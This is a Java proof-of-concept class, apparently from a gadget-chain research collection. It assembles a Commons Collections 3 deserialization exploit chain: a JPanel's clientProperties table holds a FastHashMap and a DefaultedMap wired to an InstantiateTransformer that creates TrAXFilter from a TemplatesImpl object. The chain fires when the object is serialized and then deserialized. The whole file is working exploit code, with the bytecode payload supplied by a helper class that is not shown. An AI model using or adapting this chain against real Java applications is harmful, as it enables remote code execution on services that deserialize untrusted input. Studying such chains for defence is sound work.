package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.DefaultedMap;

import javax.swing.*;
import javax.xml.transform.Templates;

public class POC_10 {

    /***
     * run with jComponent_equals.jar
     */

    public static void main(String[] args) throws Exception {
        FastHashMap fhmap1 = new FastHashMap();
        fhmap1.put(TrAXFilter.class, "value1");

        Templates templates = Share.getTemplatesImplObj();
        InstantiateTransformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        DefaultedMap d = new DefaultedMap("1");
        d.put("key2", "value2");

        ReflectionUtil.setField(d, "value", transformer);

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{fhmap1, "1", d, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);

        ReflectionUtil.setField(j, "clientProperties", arrayTable);
        SerializeUtil.deserialize(SerializeUtil.serialize(j));
    }

}
